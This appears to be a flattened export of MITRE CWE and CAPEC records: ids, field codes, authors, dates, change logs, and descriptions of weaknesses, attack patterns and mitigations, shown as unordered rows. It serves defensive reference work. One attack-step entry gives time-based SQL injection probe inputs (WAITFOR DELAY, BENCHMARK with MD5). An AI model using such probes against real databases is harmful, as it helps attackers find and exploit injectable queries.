23400	35	MITRE
15083	28	CWE Content Team
11721	69	Incomplete
20955	103	Primary
22516	56	CanAlsoBe
19659	35	MITRE
24651	33	Martin Georgiev
22008	47	Gain Privileges
14224	62	updated Demonstrative_Examples, Potential_Mitigations, References
13276	35	MITRE
12935	23	The software does not check the revocation status of a certificate after its initial revocation check, which can cause the software to perform privileged actions even after the certificate is revoked at a later time.
7171	72	if a PRNG is used incorrectly, such as using the same seed for each initialization or using a predictable seed, then an attacker may be able to easily guess the seed and thus the random numbers. This could lead to unauthorized access to a system if the seed is used for authentication and authorization.
14231	28	CWE Content Team
14258	39	2011-03-29
22744	61	Draft
9015	28	CWE Content Team
8454	35	MITRE
16399	28	CWE Content Team
12179	31	1000
20658	56	ChildOf
7505	92	Explore
22855	103	Primary
20412	61	Draft
11079	39	2017-11-08
13377	28	CWE Content Team
10607	63	DoS: Resource Consumption (Other)
11882	69	Incomplete
14981	62	updated Common_Consequences
11383	35	Cigital
11250	28	CWE Content Team
19542	62	updated Relationships
21856	51	2014-06-23
9765	39	2008-09-08
10579	33	Paulo Verissimo
23239	89	Meta
19651	91	Architecture and Design
16506	63	Bypass Protection Mechanism
20073	86	http://projects.webappsec.org/XML-Entity-Expansion
18269	35	MITRE
23350	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Methods_of_Attack, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
18166	35	KDM Analytics
18316	39	2010-02-16
7365	28	CWE Content Team
20804	81	Integrity
10311	39	2015-12-07
18760	28	CWE Content Team
6056	81	Confidentiality
22890	55	CAPEC Content Team
15097	39	2012-05-11
10978	28	CWE Content Team
11535	72	An attacker could include input that changes the LDAP query which allows unintended commands or code to be executed, allows sensitive data to be read or modified or causes other unintended behavior.
9843	43	Simple
23237	35	MITRE
22842	28	CWE Content Team
15929	42	Make decisions on the server side based on file content and not on file name or extension.
13614	39	2014-07-30
13828	62	updated Modes_of_Introduction, Relationships
10172	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
9703	35	MITRE
12384	45	Base
6840	62	updated Potential_Mitigations, References
18712	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
22372	62	updated Common_Consequences
23837	101	CAPEC Content Team
20737	100	The MITRE Corporation
18247	103	Primary
9397	21	PLOVER
13438	28	CWE Content Team
24253	62	updated Relationships
20961	28	CWE Content Team
12462	79	Authentication
15599	100	The MITRE Corporation
17698	35	MITRE
15738	28	CWE Content Team
14610	28	CWE Content Team
18450	36	http://www.ietf.org/rfc/rfc1738.txt
18754	75	Detection techniques for buffer-related errors are more mature than for most other weakness types.
24339	104	153
6967	31	1000
8123	23	By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a "gateway" to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.
8940	56	ChildOf
7167	76	2019-04-04
17560	51	2014-06-23
19016	71	2007
12700	35	MITRE
10520	77	Manual Static Analysis - Source Code
18058	35	MITRE
18614	47	Bypass Protection Mechanism
15379	27	None: No specialized resources are required to execute this type of attack.
11515	35	MITRE
10617	89	Standard
12410	77	Automated Static Analysis
23699	62	updated Observed_Examples, Related_Attack_Patterns, Relationships
11291	31	699
9626	85	641
15683	62	updated Common_Consequences, Relationships
6007	50	Strong input validation - All user-controllable input must be validated and filtered for illegal formatting characters.
23536	35	MITRE
7606	39	2019-06-20
15011	39	2019-06-20
9408	28	CWE Content Team
10712	31	1000
9892	62	updated Demonstrative_Examples, Potential_Mitigations
18707	69	Incomplete
10429	44	High
16589	40	This class of attacks does not strictly require authorized access to the application. As Attackers use this attack process to classify, map, and identify vulnerable aspects of an application, it simply requires hypotheses to be verified, interaction with the application, and time to conduct trial-and-error activities.
21685	102	ChildOf
23368	51	2018-07-31
21501	69	Draft
12288	23	This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input. When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to talk directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database. In order to successfully inject SQL and retrieve information from a database, an attacker:
16511	28	CWE Content Team
21390	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
19909	21	CLASP
19853	53	The MITRE Corporation
25200	62	updated Time_of_Introduction
7455	23	The software decodes the same input twice, which can limit the effectiveness of any protection mechanism that occurs in between the decoding operations.
10787	31	699
22715	62	updated Alternate_Terms, Applicable_Platforms, Description, Name, Observed_Examples, References, Relationships
24947	74	2
23508	62	updated Demonstrative_Examples, Observed_Examples, Relationships
8642	103	Primary
19757	62	updated Potential_Mitigations
23537	69	Incomplete
10205	45	Variant
10935	39	2017-11-08
17951	35	MITRE
10210	28	CWE Content Team
17676	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes trailing special elements that could be interpreted in unexpected ways when they are sent to a downstream component.
21577	62	Suggested OWASP Top Ten mapping
13265	31	1000
23525	62	updated Demonstrative_Examples, Observed_Examples, Other_Notes, Relationship_Notes
21265	35	MITRE
19197	63	Unexpected State
17004	105	Mobile
12407	62	added/updated white box definitions
23557	62	updated Relationships
22990	97	DNS Domain Seizure
20726	81	Availability
9111	62	updated Other_Notes, Relationship_Notes
25219	81	Confidentiality
12854	73	Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses.
11548	28	Sean Eidemiller
16495	47	Modify Data
21483	28	CWE Content Team
24079	54	Medium
16637	42	Implement Exception blocks to handle all types of Exceptions.
13927	39	2017-11-08
23999	31	1000
8492	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer                                                                     Cost effective for partial coverage:                                                                           Source Code Quality Analyzer
21061	95	[Survey application] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds. He picks out the URL parameters that may related to access to files.
11089	47	Read Data
22793	28	CWE Content Team
11004	79	Integrity
11871	28	CWE Content Team
13813	88	Function Call With Incorrectly Specified Argument Value
14401	42	Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.
7358	35	MITRE
18298	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
25198	49	2006
20977	39	2011-03-29
12020	35	MITRE
15490	50	Implementation: Obfuscate database type in Database API's error message.
13939	43	Simple
22472	23	The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.
19792	59	Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses
18301	102	PeerOf
13227	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies
19562	28	CWE Content Team
18135	76	2019-04-04
10021	39	2011-06-01
24453	103	Primary
20192	26	Installation
25024	56	ChildOf
9896	91	Architecture and Design
14893	43	Simple
23371	35	MITRE
7153	28	CWE Content Team
12158	39	2008-11-24
11206	28	CWE Content Team
18511	78	High
13172	39	2011-06-01
14974	66	Failing Securely
24958	39	2019-06-20
22161	54	Low
23151	35	MITRE
8694	28	CWE Content Team
25217	35	MITRE
21918	39	2011-09-13
20372	39	2012-05-11
8806	63	Bypass Protection Mechanism
20524	42	Examine compiler warnings closely and eliminate problems with potential security implications, such as signed / unsigned mismatch in memory operations, or use of uninitialized variables. Even if the weakness is rarely exploitable, a single failure may lead to the compromise of the entire system.
16071	31	699
22266	76	2019-09-30
16678	100	The MITRE Corporation
14960	39	2009-05-27
11994	35	MITRE
15554	39	2012-05-11
14186	73	An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.
17245	31	699
8729	55	CAPEC Content Team
8502	39	2017-11-08
12877	28	Eric Dalci
13668	28	Eric Dalci
11829	102	ChildOf
8450	59	Updated Related_Weaknesses
9955	91	Architecture and Design
22546	28	CWE Content Team
11859	76	2017-01-09
20594	31	1000
20681	62	updated Common_Consequences
14784	62	updated Common_Consequences
20221	39	2011-06-27
11164	56	CanPrecede
6298	35	MITRE
24380	28	CWE Content Team
17521	103	Primary
10822	63	Bypass Protection Mechanism
12697	21	CWE Content Team
21133	43	Simple
5802	57	Primary
7227	21	CWE Content Team
8477	35	MITRE
17946	28	CWE Content Team
22725	62	updated Relationships, Taxonomy_Mappings
13728	28	CWE Content Team
9882	35	MITRE
6567	28	CWE Content Team
18704	92	Exploit
10539	46	While the interpretation of "excessively large Fan-Out value" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.    This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
16033	21	Anonymous Tool Vendor (under NDA)
17514	102	ChildOf
13951	28	CWE Content Team
13687	21	CWE Content Team
7155	53	The MITRE Corporation
9181	39	2011-09-13
24718	78	Low
10844	35	MITRE
12148	23	An adversary corrupts or modifies the content of a schema for the purpose of undermining the security of the target. Schemas provide the structure and content definitions for resources used by an application. By replacing or modifying a schema, the adversary can affect how the application handles or interprets a resource, often leading to possible denial of service, entering into an unexpected state, or recording incomplete data.
18225	62	Suggested OWASP Top Ten 2004 mapping
21730	28	CWE Content Team
12605	56	ChildOf
8569	39	2018-03-27
20608	39	2011-09-13
8492	44	High
25346	39	2017-11-08
16910	39	2018-03-27
10077	100	The MITRE Corporation
10851	39	2009-07-27
13640	92	Exploit
16655	35	MITRE
20565	103	Primary
22415	39	2013-07-17
8544	91	Architecture and Design
7798	35	MITRE
20411	85	624
18720	63	Other
10745	77	Manual Static Analysis - Source Code
14641	56	ChildOf
8922	35	MITRE
13665	62	updated Potential_Mitigations, Time_of_Introduction
7237	28	CWE Content Team
21463	28	CWE Content Team
14724	63	Read Application Data
18685	102	ChildOf
6160	39	2012-10-30
20142	28	Eric Dalci
7311	56	ChildOf
25414	73	Obtain password hashes from platform-specific storage locations (e.g. Windows registry)
9444	102	ChildOf
9381	76	2019-09-30
16425	59	Updated Related_Attack_Patterns
12192	33	OWASP, Fortify Software
17925	32	US CERT
11126	79	Integrity
21329	63	Other
12901	81	Availability
11956	23	The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time this path is navigated.
6411	62	added/updated white box definitions
9978	39	2010-12-13
17951	39	2010-12-13
24695	97	ICMP Echo Request Ping
15474	39	2009-07-27
15477	28	CWE Content Team
13710	62	updated Demonstrative_Examples
8576	62	updated Description, Relationship_Notes, Relationships
17448	62	updated Other_Notes, Potential_Mitigations, Relationships
10673	39	2017-11-08
5765	28	CWE Content Team
14152	35	MITRE
16370	23	The user interface does not correctly enable or configure a security feature, but the interface provides feedback that causes the user to believe that the feature is in a secure state.
7388	35	MITRE
17617	62	updated Demonstrative_Examples
12705	59	Updated Related_Attack_Patterns
13912	89	Meta
18001	23	An adversary sends a UDP datagram to the remote host to determine if the host is alive. If a UDP datagram is sent to an open UDP port there is very often no response, so a typical strategy for using a UDP ping is to send the datagram to a random high port on the target. The goal is to solicit an 'ICMP port unreachable' message from the target, indicating that the host is alive. UDP pings are useful because some firewalls are not configured to block UDP datagrams sent to strange or typically unused ports, like ports in the 65K range. Additionally, while some firewalls may filter incoming ICMP, weaknesses in firewall rule-sets may allow certain types of ICMP (host unreachable, port unreachable) which are useful for UDP ping attempts.
10231	35	MITRE
13624	45	Base
8157	56	ChildOf
18803	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
11390	35	MITRE
22886	62	updated Relationships, Taxonomy_Mappings
22532	101	CAPEC Content Team
6726	69	Draft
20997	90	C
23032	63	DoS: Crash, Exit, or Restart
6646	49	2002
16545	39	2014-07-30
6416	31	699
14762	35	MITRE
8142	62	updated Relationships
16252	35	MITRE
22415	62	updated References
15612	39	2008-07-01
8151	39	2011-06-01
20211	35	MITRE
20347	55	CAPEC Content Team
23772	30	Gareth Heyes
12849	32	Unicode, Inc.
13527	28	CWE Content Team
7138	81	Confidentiality
7436	89	Standard
9314	39	2010-12-13
7042	31	1000
9862	74	5
11741	35	MITRE
10739	76	2019-04-04
12794	62	updated Description
16021	61	Stable
23478	62	updated References
16042	88	Assignment to Variable without Use
6813	45	Class
16106	39	2012-05-11
18017	31	1000
19547	42	Do not use the GET method for any request that triggers a state change.
14357	76	2015-11-09
23676	28	Eric Dalci
12247	62	updated Description
12200	28	CWE Content Team
19557	35	MITRE
5843	88	Empty Synchronized Block
14819	66	How To: Encrypt Configuration Sections in ASP.NET 2.0 Using DPAPI
20318	69	Incomplete
9394	79	Access Control
23176	62	updated Potential_Mitigations
7200	28	CWE Content Team
11857	73	Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).
8670	28	CWE Content Team
12979	62	updated Relationships
10067	95	[Attempt variations on input parameters] The adversary injects the entry points identified in the Explore Phase with response splitting syntax and variations of payloads to be acted on in the additional response. He records all the responses from the server that include unmodified versions of his payload.
11300	39	2011-09-13
16015	73	The attacker creates symlinks to files in different directories.
7751	52	Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
15431	63	Bypass Protection Mechanism
20399	102	ChildOf
21569	50	Delete all default account credentials that may be put in by the product vendor.
16243	91	Operation
18073	103	Primary
23893	91	Testing
23848	56	ChildOf
19952	104	1053
16378	31	1000
14525	28	CWE Content Team
22631	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Web Application Scanner                            Web Services Scanner                            Database Scanners
21551	105	Mobile
11180	84	08
14171	31	1000
11801	63	Read Files or Directories
23796	35	MITRE
21890	28	CWE Content Team
9332	28	CWE Content Team
18459	28	CWE Content Team
15569	31	1000
21366	70	A Remote Active OS Fingerprinting Tool using ICMP
24940	90	C
10294	28	CWE Content Team
10625	102	ChildOf
8653	66	Tip: Configure SAX parsers for secure processing
20003	39	2009-03-10
11686	28	CWE Content Team
20803	39	2014-07-30
11508	47	Bypass Protection Mechanism
16501	28	CWE Content Team
9225	21	PLOVER
11039	39	2010-02-16
7634	70	Security Risks of Unicode
24312	35	MITRE
19977	88	Expression is Always False
5619	28	CWE Content Team
20459	54	Medium
16830	51	2014-06-23
15934	101	CAPEC Content Team
8270	39	2012-05-11
8161	102	ChildOf
18057	28	CWE Content Team
7181	62	updated Potential_Mitigations
24140	43	Simple
11075	80	The adversary requires strong inter-personal and communication skills.
16843	60	10
20818	62	updated Time_of_Introduction
22850	39	2009-07-17
9314	28	CWE Content Team
10275	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
24026	35	MITRE
12293	24	MITRE
9135	101	CAPEC Content Team
7016	39	2017-11-08
17100	38	You receive an e-mail from an entity that you are not even a customer of prompting you to log into your account.
11451	35	MITRE
22602	91	Implementation
18397	40	An application uses user supplied data in queries executed against the database
7501	86	https://dev.to/ben/the-targetblank-vulnerability-by-example
13785	95	[Survey] The attacker surveys the target application, possibly as a valid and authenticated user
20118	47	Bypass Protection Mechanism
9294	88	Unprotected Storage of Credentials
23846	35	MITRE
23840	94	Run Arbitrary Code
20893	53	The MITRE Corporation
6549	28	Sean Eidemiller
24283	62	updated Relationships, Taxonomy_Mappings
16065	96	2018-07-02
18806	56	CanPrecede
11128	62	updated Common_Consequences, Relationships, Observed_Example, Weakness_Ordinalities
18841	78	Very High
22429	91	Implementation
8650	63	Quality Degradation
23881	45	Base
20160	63	Execute Unauthorized Code or Commands
22924	62	updated Potential_Mitigations, White_Box_Definitions
21200	28	CWE Content Team
11542	44	High
18251	39	2014-02-18
24870	45	Class
24469	103	Primary
23166	77	Dynamic Analysis with Automated Results Interpretation
17340	102	ChildOf
6347	62	updated Demonstrative_Examples, Other_Notes, Potential_Mitigations
19270	31	1000
6889	28	CWE Content Team
8840	62	updated Relationships
23674	101	CAPEC Content Team
10944	90	Language-Independent
11543	39	2019-01-03
8403	31	1000
15263	63	Execute Unauthorized Code or Commands
22718	22	08
10082	62	updated Related_Attack_Patterns
13497	61	Draft
15662	81	Confidentiality
22360	42	Use a web server that employs a strict HTTP parsing procedure, such as Apache [REF-433].
16762	63	Bypass Protection Mechanism
17964	81	Availability
13675	26	Architecture and Design
7082	35	MITRE
17499	44	High
21402	35	MITRE
17782	39	2014-07-30
12880	56	ChildOf
18391	21	Anonymous Tool Vendor (under NDA)
23707	35	MITRE
9239	74	2
22645	91	Implementation
16765	35	MITRE
23508	28	CWE Content Team
10554	86	http://www.security-assessment.com/Whitepapers/0x00_vs_ASP_File_Uploads.pdf
17504	35	MITRE
15541	81	Access Control
24392	85	26
24339	90	Language-Independent
8238	49	2005
17715	31	1000
23717	50	Design: Enforce principle of least privilege.
14251	23	The software does not restrict or incorrectly restricts access to a resource from an unauthorized actor.
20533	63	Execute Unauthorized Code or Commands
6202	77	Manual Static Analysis - Binary or Bytecode
6984	89	Meta
24291	103	Primary
21866	26	Implementation
19347	91	Implementation
13326	40	None
24639	81	Other
23445	35	MITRE
9148	62	updated Relationships
24278	28	CWE Content Team
12016	62	updated Relationships
24235	35	MITRE
8229	95	The attacker probes to determine the nature and mechanism of communication between two components looking for opportunities to exploit.
18050	28	CWE Content Team
21897	77	Manual Static Analysis - Source Code
22112	78	Medium
10326	95	[Reduce search space] Find ways to reduce the secret space. The smaller the attacker can make the space they need to search for the secret value, the greater their chances for success. There are a great many ways in which the search space may be reduced.
12558	103	Primary
23202	56	ChildOf
12027	25	Low
18990	35	MITRE
21859	45	Variant
17117	97	UDP Fragmentation
6298	62	updated Relationships, Taxonomy_Mappings
11013	62	updated Name
7751	77	Manual Dynamic Analysis
11316	104	269
25423	53	The MITRE Corporation
15205	62	updated Potential_Mitigations
10810	63	Execute Unauthorized Code or Commands
11782	63	Gain Privileges or Assume Identity
21249	28	CWE Content Team
8290	39	2009-10-29
12533	39	2017-11-08
6736	28	CWE Content Team
23077	94	A successful command injection attack enables an adversary to alter the command being executed and achieve a variety of negative consequences depending on the makeup of the new command. This includes potential information disclosure or the corruption of application data.
19167	80	To distribute email
17665	35	MITRE
9239	92	Exploit
9074	62	updated Relationships
18158	49	2014
12296	61	Draft
16162	100	The MITRE Corporation
16453	28	CWE Content Team
14690	62	updated Relationships
25408	62	updated Applicable_Platforms, Relationships
14789	62	updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns, Relationships
22535	39	2009-05-27
13169	69	Draft
22155	39	2008-09-08
22537	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
16042	57	Indirect
12963	69	Draft
6300	39	2017-01-19
18900	38	There are no indicators for the server since a fixated session identifier is similar to an ordinarily generated one. However, too many invalid sessions due to invalid session identifiers is a potential warning.
10975	103	Primary
9948	28	CWE Content Team
12745	102	ChildOf
13037	32	Defcon 18
7148	102	ChildOf
8437	26	Architecture and Design
15682	59	Updated Related_Attack_Patterns
18380	39	2011-06-27
14792	101	CAPEC Content Team
16179	59	Updated Description, Description Summary, Examples-Instances
5708	35	MITRE
10589	31	699
10529	42	Regularly wrap sub-expressions in parentheses, especially in security-critical code.
21918	35	MITRE
8627	28	CWE Content Team
12494	56	ChildOf
12684	39	2009-10-29
13223	21	CWE Content Team
20430	28	CWE Content Team
15466	62	updated Relationships
8135	35	MITRE
14086	39	2008-07-01
24048	56	ChildOf
23798	62	updated Time_of_Introduction
19388	31	1000
23657	91	Implementation
21904	28	CWE Content Team
9346	85	69
17345	72	By reading out-of-bounds memory, an attacker might be able to get secret values, such as memory addresses, which can be bypass protection mechanisms such as ASLR in order to improve the reliability and likelihood of exploiting a separate weakness to achieve code execution instead of just denial of service.
10987	31	1000
17116	62	updated Relationships
25408	28	CWE Content Team
7057	73	Execute a phishing attack and send a user an e-mail convincing the user to click on a link leading the user to the TypoSquatted domain.
8946	33	Jason Lam
18637	66	Top 25 Series - Rank 13 - PHP File Inclusion
23794	23	An adversary tampers with a DLL and embeds a computer virus into gaps between legitimate machine instructions. These gaps may be the result of compiler optimizations that pad memory blocks for performance gains. The embedded virus then attempts to infect any machine which interfaces with the product, and possibly steal private data or eavesdrop.
9491	28	CWE Content Team
19059	62	updated Relationships
22220	39	2009-05-27
6631	39	2012-05-11
18551	39	2017-11-08
7393	67	High
24686	91	Implementation
19413	31	1000
14278	91	Architecture and Design
21341	39	2011-06-01
16000	53	The MITRE Corporation
23909	86	http://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet
18666	28	CWE Content Team
14413	59	Updated Resources_Required
20294	63	Execute Unauthorized Code or Commands
17104	77	Manual Analysis
12837	100	The MITRE Corporation
6899	62	updated Time_of_Introduction
13978	100	The MITRE Corporation
23232	62	updated References, Relationships
15819	39	2010-02-16
15428	86	http://www.informit.com/articles/article.aspx?p=686170&seqNum=6
18436	42	Use a static analysis tool to spot dead code.
15675	39	2008-10-14
11887	39	2014-06-23
11806	31	1000
11145	90	PHP
6045	73	Leveraging one of the vulnerable inputs identified during the Experiment phase, inject malicious XQuery payload.. The payload tries to insert or replace data in the XML database.
16010	62	updated Description, Name
22060	72	Depending on the locking being used, an unlock operation might not have any adverse effects. When effects exist, the most common consequence will be a corruption of the state of the software, possibly leading to a crash or exit; depending on the implementation of the unlocking, memory corruption or code execution could occur.
23032	63	Unexpected State
20015	42	When exchanging data between components, ensure that both components are using the same character encoding. Ensure that the proper encoding is applied at each interface. Explicitly set the encoding you are using whenever the protocol allows you to do so.
11521	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
11651	44	SOAR Partial
14898	39	2014-07-30
24273	28	CWE Content Team
6475	66	Applied Cryptography
13237	62	updated Relationships
18771	74	3
5782	91	Operation
7133	66	Marshalling Pickles: How deserializing objects can ruin your day
8075	48	02
8145	45	Variant
5732	28	CWE Content Team
16715	91	Implementation
20752	77	Automated Static Analysis - Binary or Bytecode
24637	33	Pratyusa Manadhata
7495	62	updated Demonstrative_Examples, Potential_Mitigations
23851	42	Use the Thread-Specific Storage Pattern. See References.
19453	55	CAPEC Content Team
13381	62	updated Applicable_Platforms, Relationships
8933	35	MITRE
19614	35	MITRE
24678	66	Mitigating Cross-site Scripting With HTTP-only Cookies
24718	89	Detailed
18717	63	Other
8327	39	2011-06-01
14910	28	CWE Content Team
23008	101	CAPEC Content Team
14888	45	Base
7385	92	Experiment
22399	35	MITRE
18350	90	Language-Independent
8208	62	updated Potential_Mitigations
9561	73	Add delays to the SQL queries in case server does not provide clear error messages (e.g. WAITFOR DELAY '0:0:10' in SQL Server or BENCHMARK(1000000000,MD5(1) in MySQL). If these can be injected into the queries, then the length of time that the server takes to respond reveals whether the query is injectable or not.
13689	62	updated Relationships
15233	59	Updated @Abstraction
18256	28	CWE Content Team
17562	40	The adversary must have obtained logical access to the system by some means (e.g., via obtained credentials or planting malware on the system).
24880	35	MITRE
10002	99	SANS Software Security Institute
15939	39	2009-05-27
24395	31	699
18619	28	CWE Content Team
20154	28	CWE Content Team
20445	35	Cigital
23293	31	1000
23452	26	Architecture and Design
14232	48	01
18328	35	MITRE
9385	35	Cigital
14141	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
21324	63	Quality Degradation
18553	23	An adversary discovers the structure, function, and composition of an object, resource, or system by using a variety of analysis techniques to effectively determine how the analyzed entity was constructed or operates. The goal of reverse engineering is often to duplicate the function, or a part of the function, of an object in order to duplicate or "back engineer" some aspect of its functioning. Reverse engineering techniques can be applied to mechanical objects, electronic devices, or software, although the methodology and techniques involved in each type of analysis differ widely.
21948	44	Opportunistic
19477	62	updated Causal_Nature, Modes_of_Introduction, References, Relationships
20699	39	2011-06-01
20951	96	2018-07-02
9326	35	MITRE
20618	50	Use encapsulation when declaring your variables. This is to lower the exposure of your variables.
6635	85	204
24377	76	2019-04-04
9231	88	Improper Handling of Missing Special Element
10169	62	updated Applicable_Platforms, Relationships, Research_Gaps, Taxonomy_Mappings
13823	103	Primary
9095	69	Incomplete
11923	39	2019-01-03
13628	72	This is a general logic error which will often lead to obviously-incorrect behaviors that are quickly noticed and fixed. In lightly tested or untested code, this error may be introduced it into a production environment and provide additional attack vectors by creating a control flow path leading to an unexpected state in the application. The consequences will depend on the types of behaviors that are being incorrectly executed.
13473	45	Base
13757	91	Implementation
15112	26	Architecture and Design
7826	42	Utilize some sequence or time stamping functionality along with a checksum which takes this into account in order to ensure that messages can be parsed only once.
7105	74	1
16325	35	MITRE
6079	42	Ensure that each allocation is freed only once. After freeing a chunk, set the pointer to NULL to ensure the pointer cannot be freed again. In complicated error conditions, be sure that clean-up routines respect the state of allocation properly. If the language is object oriented, ensure that object destructors delete each chunk of memory only once.
14223	62	updated Potential_Mitigations
25361	26	Implementation
13901	101	CAPEC Content Team
11401	39	2012-05-11
15379	23	An adversary uses a social engineering techniques to produce a sense of obligation in the target to perform a certain action or concede some sensitive or key piece of information. Obligation has to do with actions one feels they need to take due to some sort of social, legal, or moral requirement, duty, contract, or promise. There are various techniques for fostering a sense of obligation to reciprocate or concede during ordinary modes of communication. One method is to compliment the target, and follow up the compliment with a question. If performed correctly the target may volunteer a key piece of information, sometimes involuntarily.
9374	28	CWE Content Team
17916	31	1000
23746	88	Authentication Bypass: OpenSSL CTX Object Modified after SSL Objects are Created
5740	28	CWE Content Team
24380	62	updated Name
24590	72	An attacker could modify sensitive data or program variables.
22842	39	2010-06-21
18731	81	Availability
6293	62	added/updated white box definitions
8457	43	Simple
23457	72	Often the actions performed by injected control code are unlogged.
22948	30	Thea Reilkoff
19876	43	Simple
7518	26	Operation
15504	28	CWE Content Team
9766	31	699
18964	91	Architecture and Design
13631	28	CWE Content Team
19399	28	CWE Content Team
11044	88	Use of Invariant Value in Dynamically Changing Context
22336	62	updated Relationships, Taxonomy_Mappings
14473	39	2008-07-01
18183	28	CWE Content Team
13353	28	CWE Content Team
7284	56	ChildOf
13750	92	Experiment
12105	100	The MITRE Corporation
10539	104	1048
20591	63	DoS: Crash, Exit, or Restart
5894	28	CWE Content Team
5893	39	2015-12-07
12121	76	2019-09-30
9954	62	updated Relationships, Taxonomy_Mappings
17096	89	Standard
8312	63	Varies by Context
14679	79	Confidentiality
6345	103	Primary
23380	62	updated Relationships, Taxonomy_Mappings
19180	39	2009-07-27
19328	28	Eric Dalci
5832	35	MITRE
8222	30	Marshall Brain
8867	28	CWE Content Team
12421	35	MITRE
21626	28	CWE Content Team
8707	26	Implementation
9547	72	If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.
21776	28	CWE Content Team
21832	56	ChildOf
12510	62	updated Relationships
9816	35	MITRE
23213	28	CWE Content Team
15627	102	ChildOf
22145	62	updated Relationships, Other_Notes
24055	103	Primary
20975	39	2017-11-08
7594	28	CWE Content Team
23872	81	Other
12049	39	2008-09-08
24368	104	705
10540	28	CWE Content Team
15491	35	MITRE
21312	28	CWE Content Team
22927	39	2008-09-08
10230	76	2017-08-04
19216	39	2008-10-14
8240	100	The MITRE Corporation
17389	35	MITRE
21777	62	updated Relationships, Taxonomy_Mappings
19173	28	CWE Content Team
17739	61	Draft
24908	45	Base
15905	62	updated Common_Consequences
21544	62	updated Applicable_Platforms, Description
25239	62	updated Common_Consequences
23826	59	Updated Description
10719	35	MITRE
11996	45	Class
16776	39	2013-07-17
23928	26	Implementation
20418	55	CAPEC Content Team
14527	39	2009-10-29
23898	39	2009-05-27
13554	35	MITRE
23786	91	Operation
22583	100	The MITRE Corporation
14668	28	CWE Content Team
12016	35	MITRE
24325	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   With a stateless protocol such as HTTP, use some frameworks can maintain the state for you.                   Examples include ASP.NET View State and the OWASP ESAPI Session Management feature.                   Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.
9625	28	CWE Content Team
